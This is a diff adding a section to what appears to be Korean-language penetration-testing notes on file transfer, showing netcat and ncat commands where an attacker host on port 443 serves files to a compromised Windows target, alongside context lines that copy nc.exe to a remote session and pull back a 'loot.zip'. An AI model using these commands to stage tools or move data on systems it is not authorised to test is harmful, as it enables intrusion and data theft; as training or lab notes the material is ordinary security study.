@@ -153,6 +153,18 @@ Copy-Item -Path C:\tools\nc.exe -ToSession $s -Destination C:\Temp\nc.exe
 Copy-Item -FromSession $s -Path C:\Temp\loot.zip -Destination C:\
 ```
 
+## nc / ncat 전송
+
+```bash
+# 공격자가 listen (타겟 인바운드 막혔을 때 방향 뒤집기)
+sudo nc  -l -p 443 -q 0  < file      # 원본 netcat
+sudo ncat -l -p 443 --send-only < file   # ncat
+
+# 타겟(윈도우)에서 수신
+nc.exe   <칼리IP> 443 > file
+ncat.exe <칼리IP> 443 --recv-only > file
+```
+
 ---
 
 ## 팁
